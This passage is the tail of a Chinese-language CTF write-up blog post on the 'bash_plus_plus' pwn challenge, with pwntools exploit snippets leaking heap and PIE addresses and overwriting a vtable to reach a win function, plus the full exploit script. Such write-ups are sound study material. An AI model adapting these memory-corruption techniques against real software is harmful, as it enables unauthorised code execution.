+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;$a=abc&quot;)  # 覆写v的type为long，泄露堆地址</span><br><span class="line"></span><br><span class="line">sl(&quot;a&quot; * 20)</span><br><span class="line">sl(&quot;a&quot; * 10 + &quot;|&quot;)</span><br><span class="line"></span><br><span class="line">sl(&quot;$(($a+$a))&quot;)</span><br><span class="line">ru(&quot;|&quot;)</span><br><span class="line">ru(&quot;&gt; &quot;)</span><br><span class="line">heapbase = int(int(ru(&quot;\n&quot;, drop=True), 10) / 2) - 0x13730</span><br><span class="line">log_heap_base_addr(heapbase)</span><br></pre></td></tr></table></figure>
+
+<p>参考上面的，会打印出<code>0x0000555555570b30*2</code> </p>
+<p>至于pie，堆中和pie有关的地址只有虚表和<code>variables[abi:cxx11]</code>而我们想要覆写chunk就需要覆写虚表，当然，也可以选择再新建一个不被覆写的chunk来通过他的虚表获取pie，但是我选择通过<code>variables[abi:cxx11]</code>来获取pie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;$b=AAAAAA&quot;)</span><br><span class="line">sl(b&quot;a&quot; * 0x10)</span><br><span class="line">sl(b&quot;a&quot; * 0x10)</span><br><span class="line">sl(b&quot;a&quot; * 0x7 + p64(heapbase + 79704))</span><br><span class="line">sl(b&quot;$(($b+$b))&quot;)</span><br><span class="line">ru(&quot;Invalid variable b: &quot;)</span><br><span class="line">pie = u64(ru(&quot;\n&quot;, drop=True).ljust(8, b&quot;\x00&quot;)) - 37512</span><br><span class="line">log_address_ex(&quot;pie&quot;)  # 泄露pie基址，这里是chunk0的</span><br></pre></td></tr></table></figure>
+
+<p>之后只需要将win函数填在堆上，再将虚表地址覆写为win在堆上地址即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">win = 0x2DAD + pie</span><br><span class="line"></span><br><span class="line">win_addr = heapbase + 79960</span><br><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;a&quot;)</span><br><span class="line">sl(p64(win))</span><br><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;$c=aaa&quot;)</span><br><span class="line">sl(&quot;a&quot; * 7)</span><br><span class="line">sl(&quot;A&quot; * 0x10)</span><br><span class="line">sl(p64(win_addr))</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from platform import win32_edition</span><br><span class="line">from pwncli import *</span><br><span class="line"></span><br><span class="line">cli_script()  # 使用脚本模式必须显式调用这个函数</span><br><span class="line">context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span><br><span class="line"></span><br><span class="line"># 你能够从gift里面取到很多东西</span><br><span class="line">io = gift[&quot;io&quot;]  # process或remote对象</span><br><span class="line">elf = gift[&quot;elf&quot;]  # ELF对象，ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = gift.libc  # ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">rop = gift.rop  # ROP对象</span><br><span class="line"></span><br><span class="line">filename = gift.filename  # current filename</span><br><span class="line">is_debug = gift.debug  # is debug or not</span><br><span class="line">is_remote = gift.remote  # is remote or not</span><br><span class="line">gdb_pid = gift.gdb_pid  # gdb pid if debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uu64 = lambda: u64(ru(&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span><br><span class="line"># ra = lambda: r.recvall(timeout=1)</span><br><span class="line"></span><br><span class="line"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br><span class="line">if gift.remote:</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    gift[&quot;libc&quot;] = libc</span><br><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;$a=abc&quot;)  # 覆写v的type为long，泄露堆地址</span><br><span class="line"></span><br><span class="line">sl(&quot;a&quot; * 20)</span><br><span class="line">sl(&quot;a&quot; * 10 + &quot;|&quot;)</span><br><span class="line"></span><br><span class="line">sl(&quot;$(($a+$a))&quot;)</span><br><span class="line">ru(&quot;|&quot;)</span><br><span class="line">ru(&quot;&gt; &quot;)</span><br><span class="line">heapbase = int(int(ru(&quot;\n&quot;, drop=True), 10) / 2) - 0x13730</span><br><span class="line">log_heap_base_addr(heapbase)</span><br><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;$b=AAAAAA&quot;)</span><br><span class="line">sl(b&quot;a&quot; * 0x10)</span><br><span class="line">sl(b&quot;a&quot; * 0x10)</span><br><span class="line">sl(b&quot;a&quot; * 0x7 + p64(heapbase + 79704))</span><br><span class="line"></span><br><span class="line">sl(b&quot;$(($b+$b))&quot;)</span><br><span class="line">ru(&quot;Invalid variable b: &quot;)</span><br><span class="line">pie = u64(ru(&quot;\n&quot;, drop=True).ljust(8, b&quot;\x00&quot;)) - 37512</span><br><span class="line">log_address_ex(&quot;pie&quot;)  # 泄露pie基址</span><br><span class="line">win = 0x2DAD + pie</span><br><span class="line"></span><br><span class="line">win_addr = heapbase + 79960</span><br><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;a&quot;)</span><br><span class="line">sl(p64(win))</span><br><span class="line">sl(&quot;log&quot;)</span><br><span class="line">sl(&quot;$c=aaa&quot;)</span><br><span class="line">sl(&quot;a&quot; * 7)</span><br><span class="line">sl(&quot;A&quot; * 0x10)</span><br><span class="line">sl(p64(win_addr))</span><br><span class="line">sl(&quot;$c&quot;)</span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/12/06/qemu_escape/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#anote"><span class="nav-number">1.</span> <span class="nav-text">anote</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bash-plus-plus"><span class="nav-number">2.</span> <span class="nav-text">bash_plus_plus</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">2.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
